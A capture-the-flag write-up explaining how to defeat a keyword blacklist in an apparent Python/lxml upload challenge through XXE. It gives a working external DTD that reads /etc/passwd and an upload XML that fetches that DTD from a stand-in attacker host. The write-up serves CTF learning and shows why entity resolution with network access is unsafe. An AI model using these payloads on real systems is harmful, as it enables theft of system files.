# PASX Challenge Validation Bypass Strategies

The `app.py` script implements a blacklist-based filter that scans the **raw content string** of the uploaded XML file. However, the `lxml` parser is configured with `resolve_entities=True` and `no_network=False`.

## 1. Vulnerability Analysis
The security check `sanitize(xml_content)` has two main flaws:
1.  **Context-Free String Matching**: It only checks the uploaded file's content. It does **not** check the content of any external resources referenced by the XML.
2.  **Unsafe Parser Configuration**: The parser allows network access and entity resolution.

```python
parser = etree.XMLParser(..., no_network=False, resolve_entities=True, ...)
```

## 2. Primary Bypass: External DTD (XXE)
Since we cannot use keywords like `file`, `etc`, or `flag` directly in the uploaded XML (they are blacklisted), we must hide them in an external DTD. The application allows outbound network connections (`no_network=False`), so we can host a malicious DTD on a server we control.

### Step 1: Host the Malicious DTD
Host a file named `payload.dtd` on an external server (or your local IP if accessible by the container). This file contains the "banned" keywords, which are not scanned by the Python script.

**payload.dtd**
```xml
<!ENTITY content SYSTEM "file:///etc/passwd">
```

### Step 2: Upload the Exploit XML
The uploaded file references the external DTD. The `sanitize` function only sees the URL (which must not contain banned words), but the parser fetches the DTD and executes the instructions containing the banned words.

**exploit.pasx**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/payload.dtd">
  %remote;
]>
<book>
  <title>&content;</title> <!-- &content; is defined in payload.dtd -->
  <author>Hacker</author>
  <year>2024</year>
  <chapters>
    <chapter number="1">
      <title>Exploited</title>
      <content>The title above should contain the file content.</content>
    </chapter>
  </chapters>
</book>
```

**Banned Word Check:**
-   `http://ATTACKER_IP:8000/payload.dtd`: **SAFE** (Assuming IP/filename doesn't contain "tmp", "proc", etc.)
-   `&content;`: **SAFE** (Does not contain "flag" or "file")

## 3. Alternative: PHP Conversion Filters (If PHP was present)
*Note: This is a Python app, so `php://` wrappers won't work. This is just for completeness in CTF contexts.*
If this were PHP, we could use `php://filter` to base64 encode the file content, bypassing string matching on the content itself (e.g., if the blacklist checked the result). But here the blacklist checks the request, so External DTD is the only viable path for banned keywords.

## 4. Parameter Entity Obfuscation (Limited)
Inside an internal DTD subset, you cannot reference parameter entities in markup declarations in the same subset. You would need an external DTD anyway to do advanced parameter entity string construction.

## Summary
The "External DTD" strategy is the intended bypass. It leverages the fact that the validator only inspects the initial request body, while the parser is allowed to fetch and process external trust boundaries.
